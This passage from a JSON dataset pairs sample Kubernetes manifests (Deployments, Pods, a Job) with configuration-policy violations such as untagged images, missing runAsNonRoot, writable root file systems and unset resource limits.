    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    app: spring-petclinic\n  name: spring-petclinic\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: spring-petclinic\n  template:\n    metadata:\n      labels:\n        app: spring-petclinic\n    spec:\n      containers:\n      - image: quay.io/deepaked/spring-petclinic:v0.0.14\n        imagePullPolicy: Always\n        name: spring-petclinic\n        ports:\n        - containerPort: 8080\n          protocol: TCP\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"spring-petclinic\" has memory limit 0"
  },
  {
    "id": "03673",
    "manifest_path": "data/manifests/the_stack_sample/sample_1629.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: registry\n  labels:\n    app: registry\nspec:\n  selector:\n    matchLabels:\n      app: registry\n  template:\n    metadata:\n      labels:\n        app: registry\n        spiffe.io/spiffe-id: 'true'\n    spec:\n      containers:\n      - image: ghcr.io/networkservicemesh/ci/cmd-registry-memory:75c22d7\n        env:\n        - name: SPIFFE_ENDPOINT_SOCKET\n          value: unix:///run/spire/sockets/agent.sock\n        - name: REGISTRY_MEMORY_LISTEN_ON\n          value: tcp://:5002\n        - name: REGISTRY_MEMORY_LOG_LEVEL\n          value: TRACE\n        - name: REGISTRY_MEMORY_PROXY_REGISTRY_URL\n          value: nsmgr-proxy:5004\n        imagePullPolicy: IfNotPresent\n        name: registry\n        ports:\n        - containerPort: 5002\n          hostPort: 5002\n        volumeMounts:\n        - name: spire-agent-socket\n          mountPath: /run/spire/sockets\n        resources:\n          requests:\n            cpu: 100m\n          limits:\n            memory: 40Mi\n            cpu: 200m\n      volumes:\n      - name: spire-agent-socket\n        hostPath:\n          path: /run/spire/sockets\n          type: Directory\n      - name: nsm-socket\n        hostPath:\n          path: /var/lib/networkservicemesh\n          type: DirectoryOrCreate\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"registry\" does not have a read-only root file system"
  },
  {
    "id": "03674",
    "manifest_path": "data/manifests/the_stack_sample/sample_1629.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: registry\n  labels:\n    app: registry\nspec:\n  selector:\n    matchLabels:\n      app: registry\n  template:\n    metadata:\n      labels:\n        app: registry\n        spiffe.io/spiffe-id: 'true'\n    spec:\n      containers:\n      - image: ghcr.io/networkservicemesh/ci/cmd-registry-memory:75c22d7\n        env:\n        - name: SPIFFE_ENDPOINT_SOCKET\n          value: unix:///run/spire/sockets/agent.sock\n        - name: REGISTRY_MEMORY_LISTEN_ON\n          value: tcp://:5002\n        - name: REGISTRY_MEMORY_LOG_LEVEL\n          value: TRACE\n        - name: REGISTRY_MEMORY_PROXY_REGISTRY_URL\n          value: nsmgr-proxy:5004\n        imagePullPolicy: IfNotPresent\n        name: registry\n        ports:\n        - containerPort: 5002\n          hostPort: 5002\n        volumeMounts:\n        - name: spire-agent-socket\n          mountPath: /run/spire/sockets\n        resources:\n          requests:\n            cpu: 100m\n          limits:\n            memory: 40Mi\n            cpu: 200m\n      volumes:\n      - name: spire-agent-socket\n        hostPath:\n          path: /run/spire/sockets\n          type: Directory\n      - name: nsm-socket\n        hostPath:\n          path: /var/lib/networkservicemesh\n          type: DirectoryOrCreate\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"registry\" is not set to runAsNonRoot"
  },
  {
    "id": "03675",
    "manifest_path": "data/manifests/the_stack_sample/sample_1630.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: aws-cli\n  namespace: default\n  labels:\n    name: aws-cli\nspec:\n  serviceAccount: pod-iam-identity\n  serviceAccountName: pod-iam-identity\n  containers:\n  - name: aws-cli\n    image: cloudkats/ci-tools:2019.12\n    command:\n    - sleep\n    - '999'\n    resources:\n      limits:\n        cpu: 100m\n        memory: 100Mi\n      requests:\n        cpu: 100m\n        memory: 100Mi\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"aws-cli\" does not have a read-only root file system"
  },
  {
    "id": "03676",
    "manifest_path": "data/manifests/the_stack_sample/sample_1630.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: aws-cli\n  namespace: default\n  labels:\n    name: aws-cli\nspec:\n  serviceAccount: pod-iam-identity\n  serviceAccountName: pod-iam-identity\n  containers:\n  - name: aws-cli\n    image: cloudkats/ci-tools:2019.12\n    command:\n    - sleep\n    - '999'\n    resources:\n      limits:\n        cpu: 100m\n        memory: 100Mi\n      requests:\n        cpu: 100m\n        memory: 100Mi\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"aws-cli\" is not set to runAsNonRoot"
  },
  {
    "id": "03677",
    "manifest_path": "data/manifests/the_stack_sample/sample_1631.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: mongo\nspec:\n  selector:\n    matchLabels:\n      app: mongo\n  template:\n    metadata:\n      labels:\n        app: mongo\n    spec:\n      containers:\n      - name: mongo\n        image: mongo\n        ports:\n        - containerPort: 27017\n        volumeMounts:\n        - name: storage\n          mountPath: /data/db\n      volumes:\n      - name: storage\n        persistentVolumeClaim:\n          claimName: mongo-pvc\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"mongo\" is using an invalid container image, \"mongo\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "03678",
    "manifest_path": "data/manifests/the_stack_sample/sample_1631.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: mongo\nspec:\n  selector:\n    matchLabels:\n      app: mongo\n  template:\n    metadata:\n      labels:\n        app: mongo\n    spec:\n      containers:\n      - name: mongo\n        image: mongo\n        ports:\n        - containerPort: 27017\n        volumeMounts:\n        - name: storage\n          mountPath: /data/db\n      volumes:\n      - name: storage\n        persistentVolumeClaim:\n          claimName: mongo-pvc\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"mongo\" does not have a read-only root file system"
  },
  {
    "id": "03679",
    "manifest_path": "data/manifests/the_stack_sample/sample_1631.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: mongo\nspec:\n  selector:\n    matchLabels:\n      app: mongo\n  template:\n    metadata:\n      labels:\n        app: mongo\n    spec:\n      containers:\n      - name: mongo\n        image: mongo\n        ports:\n        - containerPort: 27017\n        volumeMounts:\n        - name: storage\n          mountPath: /data/db\n      volumes:\n      - name: storage\n        persistentVolumeClaim:\n          claimName: mongo-pvc\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"mongo\" is not set to runAsNonRoot"
  },
  {
    "id": "03680",
    "manifest_path": "data/manifests/the_stack_sample/sample_1631.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: mongo\nspec:\n  selector:\n    matchLabels:\n      app: mongo\n  template:\n    metadata:\n      labels:\n        app: mongo\n    spec:\n      containers:\n      - name: mongo\n        image: mongo\n        ports:\n        - containerPort: 27017\n        volumeMounts:\n        - name: storage\n          mountPath: /data/db\n      volumes:\n      - name: storage\n        persistentVolumeClaim:\n          claimName: mongo-pvc\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"mongo\" has cpu request 0"
  },
  {
    "id": "03681",
    "manifest_path": "data/manifests/the_stack_sample/sample_1631.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: mongo\nspec:\n  selector:\n    matchLabels:\n      app: mongo\n  template:\n    metadata:\n      labels:\n        app: mongo\n    spec:\n      containers:\n      - name: mongo\n        image: mongo\n        ports:\n        - containerPort: 27017\n        volumeMounts:\n        - name: storage\n          mountPath: /data/db\n      volumes:\n      - name: storage\n        persistentVolumeClaim:\n          claimName: mongo-pvc\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"mongo\" has memory limit 0"
  },
  {
    "id": "03682",
    "manifest_path": "data/manifests/the_stack_sample/sample_1632.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: aws-ebs-csi-driver-operator\n  namespace: openshift-cluster-csi-drivers\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      name: aws-ebs-csi-driver-operator\n  template:\n    metadata:\n      labels:\n        name: aws-ebs-csi-driver-operator\n    spec:\n      containers:\n      - args:\n        - start\n        - -v=${LOG_LEVEL}\n        env:\n        - name: DRIVER_IMAGE\n          value: ${DRIVER_IMAGE}\n        - name: PROVISIONER_IMAGE\n          value: ${PROVISIONER_IMAGE}\n        - name: ATTACHER_IMAGE\n          value: ${ATTACHER_IMAGE}\n        - name: RESIZER_IMAGE\n          value: ${RESIZER_IMAGE}\n        - name: SNAPSHOTTER_IMAGE\n          value: ${SNAPSHOTTER_IMAGE}\n        - name: NODE_DRIVER_REGISTRAR_IMAGE\n          value: ${NODE_DRIVER_REGISTRAR_IMAGE}\n        - name: LIVENESS_PROBE_IMAGE\n          value: ${LIVENESS_PROBE_IMAGE}\n        - name: KUBE_RBAC_PROXY_IMAGE\n          value: ${KUBE_RBAC_PROXY_IMAGE}\n        - name: POD_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.name\n        image: ${OPERATOR_IMAGE}\n        imagePullPolicy: IfNotPresent\n        name: aws-ebs-csi-driver-operator\n        resources:\n          requests:\n            memory: 50Mi\n            cpu: 10m\n      serviceAccountName: aws-ebs-csi-driver-operator\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"aws-ebs-csi-driver-operator\" is using an invalid container image, \"${OPERATOR_IMAGE}\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "03683",
    "manifest_path": "data/manifests/the_stack_sample/sample_1632.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: aws-ebs-csi-driver-operator\n  namespace: openshift-cluster-csi-drivers\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      name: aws-ebs-csi-driver-operator\n  template:\n    metadata:\n      labels:\n        name: aws-ebs-csi-driver-operator\n    spec:\n      containers:\n      - args:\n        - start\n        - -v=${LOG_LEVEL}\n        env:\n        - name: DRIVER_IMAGE\n          value: ${DRIVER_IMAGE}\n        - name: PROVISIONER_IMAGE\n          value: ${PROVISIONER_IMAGE}\n        - name: ATTACHER_IMAGE\n          value: ${ATTACHER_IMAGE}\n        - name: RESIZER_IMAGE\n          value: ${RESIZER_IMAGE}\n        - name: SNAPSHOTTER_IMAGE\n          value: ${SNAPSHOTTER_IMAGE}\n        - name: NODE_DRIVER_REGISTRAR_IMAGE\n          value: ${NODE_DRIVER_REGISTRAR_IMAGE}\n        - name: LIVENESS_PROBE_IMAGE\n          value: ${LIVENESS_PROBE_IMAGE}\n        - name: KUBE_RBAC_PROXY_IMAGE\n          value: ${KUBE_RBAC_PROXY_IMAGE}\n        - name: POD_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.name\n        image: ${OPERATOR_IMAGE}\n        imagePullPolicy: IfNotPresent\n        name: aws-ebs-csi-driver-operator\n        resources:\n          requests:\n            memory: 50Mi\n            cpu: 10m\n      serviceAccountName: aws-ebs-csi-driver-operator\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"aws-ebs-csi-driver-operator\" does not have a read-only root file system"
  },
  {
    "id": "03684",
    "manifest_path": "data/manifests/the_stack_sample/sample_1632.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: aws-ebs-csi-driver-operator\n  namespace: openshift-cluster-csi-drivers\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      name: aws-ebs-csi-driver-operator\n  template:\n    metadata:\n      labels:\n        name: aws-ebs-csi-driver-operator\n    spec:\n      containers:\n      - args:\n        - start\n        - -v=${LOG_LEVEL}\n        env:\n        - name: DRIVER_IMAGE\n          value: ${DRIVER_IMAGE}\n        - name: PROVISIONER_IMAGE\n          value: ${PROVISIONER_IMAGE}\n        - name: ATTACHER_IMAGE\n          value: ${ATTACHER_IMAGE}\n        - name: RESIZER_IMAGE\n          value: ${RESIZER_IMAGE}\n        - name: SNAPSHOTTER_IMAGE\n          value: ${SNAPSHOTTER_IMAGE}\n        - name: NODE_DRIVER_REGISTRAR_IMAGE\n          value: ${NODE_DRIVER_REGISTRAR_IMAGE}\n        - name: LIVENESS_PROBE_IMAGE\n          value: ${LIVENESS_PROBE_IMAGE}\n        - name: KUBE_RBAC_PROXY_IMAGE\n          value: ${KUBE_RBAC_PROXY_IMAGE}\n        - name: POD_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.name\n        image: ${OPERATOR_IMAGE}\n        imagePullPolicy: IfNotPresent\n        name: aws-ebs-csi-driver-operator\n        resources:\n          requests:\n            memory: 50Mi\n            cpu: 10m\n      serviceAccountName: aws-ebs-csi-driver-operator\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"aws-ebs-csi-driver-operator\" is not set to runAsNonRoot"
  },
  {
    "id": "03685",
    "manifest_path": "data/manifests/the_stack_sample/sample_1632.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: aws-ebs-csi-driver-operator\n  namespace: openshift-cluster-csi-drivers\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      name: aws-ebs-csi-driver-operator\n  template:\n    metadata:\n      labels:\n        name: aws-ebs-csi-driver-operator\n    spec:\n      containers:\n      - args:\n        - start\n        - -v=${LOG_LEVEL}\n        env:\n        - name: DRIVER_IMAGE\n          value: ${DRIVER_IMAGE}\n        - name: PROVISIONER_IMAGE\n          value: ${PROVISIONER_IMAGE}\n        - name: ATTACHER_IMAGE\n          value: ${ATTACHER_IMAGE}\n        - name: RESIZER_IMAGE\n          value: ${RESIZER_IMAGE}\n        - name: SNAPSHOTTER_IMAGE\n          value: ${SNAPSHOTTER_IMAGE}\n        - name: NODE_DRIVER_REGISTRAR_IMAGE\n          value: ${NODE_DRIVER_REGISTRAR_IMAGE}\n        - name: LIVENESS_PROBE_IMAGE\n          value: ${LIVENESS_PROBE_IMAGE}\n        - name: KUBE_RBAC_PROXY_IMAGE\n          value: ${KUBE_RBAC_PROXY_IMAGE}\n        - name: POD_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.name\n        image: ${OPERATOR_IMAGE}\n        imagePullPolicy: IfNotPresent\n        name: aws-ebs-csi-driver-operator\n        resources:\n          requests:\n            memory: 50Mi\n            cpu: 10m\n      serviceAccountName: aws-ebs-csi-driver-operator\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"aws-ebs-csi-driver-operator\" has memory limit 0"
  },
  {
    "id": "03686",
    "manifest_path": "data/manifests/the_stack_sample/sample_1641.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: pod-centos\n  labels:\n    component: apache_webserver\nspec:\n  containers:\n  - name: cntr-centos\n    image: centos\n    env:\n    - name: FruitName\n      valueFrom:\n        configMapKeyRef:\n          name: fav-fruit\n          key: fruit.name\n    - name: FruitColor\n      valueFrom:\n        configMapKeyRef:\n          name: fav-fruit\n          key: fruit.color\n    command:\n    - /bin/bash\n    - -c\n    args:\n    - while true ; do date ; curl -s http://svc-clusterip-httpd.default.svc.cluster.local:4000\n      ; sleep 10 ; done\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"cntr-centos\" is using an invalid container image, \"centos\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "03687",
    "manifest_path": "data/manifests/the_stack_sample/sample_1641.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: pod-centos\n  labels:\n    component: apache_webserver\nspec:\n  containers:\n  - name: cntr-centos\n    image: centos\n    env:\n    - name: FruitName\n      valueFrom:\n        configMapKeyRef:\n          name: fav-fruit\n          key: fruit.name\n    - name: FruitColor\n      valueFrom:\n        configMapKeyRef:\n          name: fav-fruit\n          key: fruit.color\n    command:\n    - /bin/bash\n    - -c\n    args:\n    - while true ; do date ; curl -s http://svc-clusterip-httpd.default.svc.cluster.local:4000\n      ; sleep 10 ; done\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"cntr-centos\" does not have a read-only root file system"
  },
  {
    "id": "03688",
    "manifest_path": "data/manifests/the_stack_sample/sample_1641.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: pod-centos\n  labels:\n    component: apache_webserver\nspec:\n  containers:\n  - name: cntr-centos\n    image: centos\n    env:\n    - name: FruitName\n      valueFrom:\n        configMapKeyRef:\n          name: fav-fruit\n          key: fruit.name\n    - name: FruitColor\n      valueFrom:\n        configMapKeyRef:\n          name: fav-fruit\n          key: fruit.color\n    command:\n    - /bin/bash\n    - -c\n    args:\n    - while true ; do date ; curl -s http://svc-clusterip-httpd.default.svc.cluster.local:4000\n      ; sleep 10 ; done\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"cntr-centos\" is not set to runAsNonRoot"
  },
  {
    "id": "03689",
    "manifest_path": "data/manifests/the_stack_sample/sample_1641.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: pod-centos\n  labels:\n    component: apache_webserver\nspec:\n  containers:\n  - name: cntr-centos\n    image: centos\n    env:\n    - name: FruitName\n      valueFrom:\n        configMapKeyRef:\n          name: fav-fruit\n          key: fruit.name\n    - name: FruitColor\n      valueFrom:\n        configMapKeyRef:\n          name: fav-fruit\n          key: fruit.color\n    command:\n    - /bin/bash\n    - -c\n    args:\n    - while true ; do date ; curl -s http://svc-clusterip-httpd.default.svc.cluster.local:4000\n      ; sleep 10 ; done\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"cntr-centos\" has cpu request 0"
  },
  {
    "id": "03690",
    "manifest_path": "data/manifests/the_stack_sample/sample_1641.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: pod-centos\n  labels:\n    component: apache_webserver\nspec:\n  containers:\n  - name: cntr-centos\n    image: centos\n    env:\n    - name: FruitName\n      valueFrom:\n        configMapKeyRef:\n          name: fav-fruit\n          key: fruit.name\n    - name: FruitColor\n      valueFrom:\n        configMapKeyRef:\n          name: fav-fruit\n          key: fruit.color\n    command:\n    - /bin/bash\n    - -c\n    args:\n    - while true ; do date ; curl -s http://svc-clusterip-httpd.default.svc.cluster.local:4000\n      ; sleep 10 ; done\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"cntr-centos\" has memory limit 0"
  },
  {
    "id": "03691",
    "manifest_path": "data/manifests/the_stack_sample/sample_1644.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    app: generator\n    demo: 'true'\n  name: generator\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      app: generator\n  template:\n    metadata:\n      labels:\n        app: generator\n      annotations:\n        instrumentation.opentelemetry.io/inject-python: 'true'\n    spec:\n      containers:\n      - image: jamesgresql/opentelemetry-demo-u_generator:0.7\n        name: generator\n        ports:\n        - containerPort: 5000\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"generator\" does not have a read-only root file system"
  },
  {
    "id": "03692",
    "manifest_path": "data/manifests/the_stack_sample/sample_1644.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    app: generator\n    demo: 'true'\n  name: generator\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      app: generator\n  template:\n    metadata:\n      labels:\n        app: generator\n      annotations:\n        instrumentation.opentelemetry.io/inject-python: 'true'\n    spec:\n      containers:\n      - image: jamesgresql/opentelemetry-demo-u_generator:0.7\n        name: generator\n        ports:\n        - containerPort: 5000\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"generator\" is not set to runAsNonRoot"
  },
  {
    "id": "03693",
    "manifest_path": "data/manifests/the_stack_sample/sample_1644.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    app: generator\n    demo: 'true'\n  name: generator\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      app: generator\n  template:\n    metadata:\n      labels:\n        app: generator\n      annotations:\n        instrumentation.opentelemetry.io/inject-python: 'true'\n    spec:\n      containers:\n      - image: jamesgresql/opentelemetry-demo-u_generator:0.7\n        name: generator\n        ports:\n        - containerPort: 5000\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"generator\" has cpu request 0"
  },
  {
    "id": "03694",
    "manifest_path": "data/manifests/the_stack_sample/sample_1644.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    app: generator\n    demo: 'true'\n  name: generator\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      app: generator\n  template:\n    metadata:\n      labels:\n        app: generator\n      annotations:\n        instrumentation.opentelemetry.io/inject-python: 'true'\n    spec:\n      containers:\n      - image: jamesgresql/opentelemetry-demo-u_generator:0.7\n        name: generator\n        ports:\n        - containerPort: 5000\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"generator\" has memory limit 0"
  },
  {
    "id": "03695",
    "manifest_path": "data/manifests/the_stack_sample/sample_1645.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: backend\n  labels:\n    app: backend\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      app: backend\n  template:\n    metadata:\n      labels:\n        app: backend\n    spec:\n      containers:\n      - name: backend\n        image: gcr.io/noted-gizmo-230214/backend:cv-backend-2\n        ports:\n        - containerPort: 5000\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"backend\" does not have a read-only root file system"
  },
  {
    "id": "03696",
    "manifest_path": "data/manifests/the_stack_sample/sample_1645.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: backend\n  labels:\n    app: backend\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      app: backend\n  template:\n    metadata:\n      labels:\n        app: backend\n    spec:\n      containers:\n      - name: backend\n        image: gcr.io/noted-gizmo-230214/backend:cv-backend-2\n        ports:\n        - containerPort: 5000\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"backend\" is not set to runAsNonRoot"
  },
  {
    "id": "03697",
    "manifest_path": "data/manifests/the_stack_sample/sample_1645.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: backend\n  labels:\n    app: backend\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      app: backend\n  template:\n    metadata:\n      labels:\n        app: backend\n    spec:\n      containers:\n      - name: backend\n        image: gcr.io/noted-gizmo-230214/backend:cv-backend-2\n        ports:\n        - containerPort: 5000\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"backend\" has cpu request 0"
  },
  {
    "id": "03698",
    "manifest_path": "data/manifests/the_stack_sample/sample_1645.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: backend\n  labels:\n    app: backend\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      app: backend\n  template:\n    metadata:\n      labels:\n        app: backend\n    spec:\n      containers:\n      - name: backend\n        image: gcr.io/noted-gizmo-230214/backend:cv-backend-2\n        ports:\n        - containerPort: 5000\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"backend\" has memory limit 0"
  },
  {
    "id": "03699",
    "manifest_path": "data/manifests/the_stack_sample/sample_1646.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: kubernetestest-416b\nspec:\n  replicas: 2\n  selector:\n    matchLabels:\n      app: kubernetestest-416b\n  template:\n    metadata:\n      labels:\n        app: kubernetestest-416b\n    spec:\n      containers:\n      - name: kubernetestest-416b\n        image: lstestgithubregistry.azurecr.io/kubernetestest\n        ports:\n        - containerPort: 7000\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"kubernetestest-416b\" is using an invalid container image, \"lstestgithubregistry.azurecr.io/kubernetestest\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "03700",
    "manifest_path": "data/manifests/the_stack_sample/sample_1646.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: kubernetestest-416b\nspec:\n  replicas: 2\n  selector:\n    matchLabels:\n      app: kubernetestest-416b\n  template:\n    metadata:\n      labels:\n        app: kubernetestest-416b\n    spec:\n      containers:\n      - name: kubernetestest-416b\n        image: lstestgithubregistry.azurecr.io/kubernetestest\n        ports:\n        - containerPort: 7000\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"kubernetestest-416b\" does not have a read-only root file system"
  },
  {
    "id": "03701",
    "manifest_path": "data/manifests/the_stack_sample/sample_1646.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: kubernetestest-416b\nspec:\n  replicas: 2\n  selector:\n    matchLabels:\n      app: kubernetestest-416b\n  template:\n    metadata:\n      labels:\n        app: kubernetestest-416b\n    spec:\n      containers:\n      - name: kubernetestest-416b\n        image: lstestgithubregistry.azurecr.io/kubernetestest\n        ports:\n        - containerPort: 7000\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"kubernetestest-416b\" is not set to runAsNonRoot"
  },
  {
    "id": "03702",
    "manifest_path": "data/manifests/the_stack_sample/sample_1646.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: kubernetestest-416b\nspec:\n  replicas: 2\n  selector:\n    matchLabels:\n      app: kubernetestest-416b\n  template:\n    metadata:\n      labels:\n        app: kubernetestest-416b\n    spec:\n      containers:\n      - name: kubernetestest-416b\n        image: lstestgithubregistry.azurecr.io/kubernetestest\n        ports:\n        - containerPort: 7000\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"kubernetestest-416b\" has cpu request 0"
  },
  {
    "id": "03703",
    "manifest_path": "data/manifests/the_stack_sample/sample_1646.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: kubernetestest-416b\nspec:\n  replicas: 2\n  selector:\n    matchLabels:\n      app: kubernetestest-416b\n  template:\n    metadata:\n      labels:\n        app: kubernetestest-416b\n    spec:\n      containers:\n      - name: kubernetestest-416b\n        image: lstestgithubregistry.azurecr.io/kubernetestest\n        ports:\n        - containerPort: 7000\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"kubernetestest-416b\" has memory limit 0"
  },
  {
    "id": "03704",
    "manifest_path": "data/manifests/the_stack_sample/sample_1648.yaml",
    "manifest_yaml": "apiVersion: batch/v1\nkind: Job\nmetadata:\n  namespace: litmus\nspec:\n  template:\n    metadata:\n      labels:\n        name: openebs-target-failure\n    spec:\n      serviceAccountName: litmus\n      containers:\n      - name: ansibletest\n        image: openebs/ansible-runner:ci\n        env:\n        - name: ANSIBLE_STDOUT_CALLBACK\n          value: default\n        - name: APP_NAMESPACE\n          value: litmus\n        - name: TARGET_NAMESPACE\n          value: openebs\n        - name: APP_LABEL\n          value: name=percona\n        - name: APP_PVC\n          value: percona-mysql-claim\n        - name: LIVENESS_APP_LABEL\n          value: ''\n        - name: LIVENESS_APP_NAMESPACE\n          value: ''\n        command:\n        - /bin/bash\n        args:\n        - -c\n        - ansible-playbook ./percona/chaos/openebs_target_failure/test.yml -i /etc/ansible/hosts\n          -vv; exit 0\n        volumeMounts:\n        - name: logs\n          mountPath: /var/log/ansible\n      - name: logger\n        image: openebs/logger\n        env:\n        - name: MY_POD_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.name\n        - name: MY_POD_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        - name: MY_POD_HOSTPATH\n          value: /mnt/chaos/openebs-cstor-target-failure\n        command:\n        - /bin/bash\n        args:\n        - -c\n        - ./logger.sh -d ansibletest -r maya,openebs,pvc,percona; exit 0\n        volumeMounts:\n        - name: kubeconfig\n          mountPath: /root/admin.conf\n          subPath: admin.conf\n        - name: logs\n          mountPath: /mnt\n      volumes:\n      - name: kubeconfig\n        configMap:\n          name: kubeconfig\n      - name: logs\n        hostPath:\n          path: /mnt/chaos/openebs_cstor_target_failure\n          type: ''\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"logger\" is using an invalid container image, \"openebs/logger\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "03705",
    "manifest_path": "data/manifests/the_stack_sample/sample_1648.yaml",
